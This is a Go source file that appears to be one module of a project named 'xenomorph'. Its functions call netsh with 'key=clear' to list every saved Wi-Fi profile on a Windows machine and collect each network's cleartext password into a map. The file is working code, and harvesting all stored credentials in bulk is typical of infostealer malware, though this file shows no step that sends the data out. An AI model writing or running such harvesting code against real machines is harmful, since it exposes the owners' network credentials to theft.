package network

import (
	"bytes"
	"fmt"
	"os/exec"
	"regexp"
	"strings"

	"github.com/codevault-llc/xenomorph/pkg/utils"
)

func GetWiFiPasswordWindows(ssid string) (string, error) {
	cmd := exec.Command("netsh", "wlan", "show", "profile", fmt.Sprintf("name=%q", ssid), "key=clear")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return "", err
	}

	re := regexp.MustCompile(`Key Content\s*:\s*(.*)`)
	matches := re.FindStringSubmatch(out.String())
	if len(matches) > 1 {
		return strings.TrimSpace(matches[1]), nil
	}

	return "", fmt.Errorf("password not found for SSID: %s", ssid)
}

func GetAllWiFiPasswordsWindows() (map[string]string, error) {
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("failed to list WiFi profiles: %w", err)
	}

	ssidRegex := regexp.MustCompile(`All User Profile\s*:\s*(.*)`)
	lines := strings.Split(string(output), "\n")

	passwords := make(map[string]string)
	for _, line := range lines {
		match := ssidRegex.FindStringSubmatch(line)
		if len(match) < 2 {
			continue
		}
		ssid := strings.TrimSpace(match[1])
		password, err := GetWiFiPasswordWindows(ssid)
		if err == nil && password != "" {
			passwords[ssid] = password
		}
	}
	return passwords, nil
}

func GetAllWiFiPasswords() (map[string]string, error) {
	switch {
	case utils.IsWindows():
		return GetAllWiFiPasswordsWindows()
	case utils.IsMacOS(), utils.IsLinux():
		// These OSes don't easily allow listing all SSIDs without being connected to them,
		// so we can only attempt for currently connected SSID.
		return nil, fmt.Errorf("SSID scanning not supported on this OS")
	default:
		return nil, fmt.Errorf("unsupported operating system")
	}
}